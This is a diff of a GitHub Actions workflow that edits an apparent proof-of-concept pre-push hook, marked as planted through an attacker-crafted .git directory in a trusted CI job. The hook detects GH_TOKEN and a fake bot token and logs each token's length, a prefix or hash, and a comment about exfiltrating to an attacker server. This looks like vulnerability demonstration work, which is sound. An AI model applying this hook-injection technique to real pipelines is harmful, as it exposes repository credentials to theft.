@@ -29,13 +29,13 @@ jobs:
           #!/bin/sh
           echo "[HOOK-FIRED] pre-push hook from attacker-crafted .git executed in TRUSTED job"
           if [ -n "$GH_TOKEN" ]; then
-            echo "[GH_TOKEN-IN-ENV] present, length=${#GH_TOKEN}, prefix=${GH_TOKEN:0:4}****"
+            echo "[GH_TOKEN-IN-ENV] present, length=$(printf %s "$GH_TOKEN" | wc -c | tr -d ' '), prefix=$(printf %s "$GH_TOKEN" | cut -c1-4)****"
           else
             echo "[GH_TOKEN-IN-ENV] NOT SET"
           fi
           if [ -n "$FAKE_BOT_TOKEN" ]; then
             H=$(printf %s "$FAKE_BOT_TOKEN" | sha256sum | cut -c1-16)
-            echo "[VICTIM-SECRET-CAPTURED] FAKE_BOT_TOKEN present, length=${#FAKE_BOT_TOKEN}, sha256[:16]=$H (real attack: exfiltrated to attacker server)"
+            echo "[VICTIM-SECRET-CAPTURED] FAKE_BOT_TOKEN present, length=$(printf %s "$FAKE_BOT_TOKEN" | wc -c | tr -d ' '), sha256[:16]=$H (real attack: exfiltrated to attacker server)"
           else
             echo "[VICTIM-SECRET-CAPTURED] FAKE_BOT_TOKEN NOT SET"
           fi
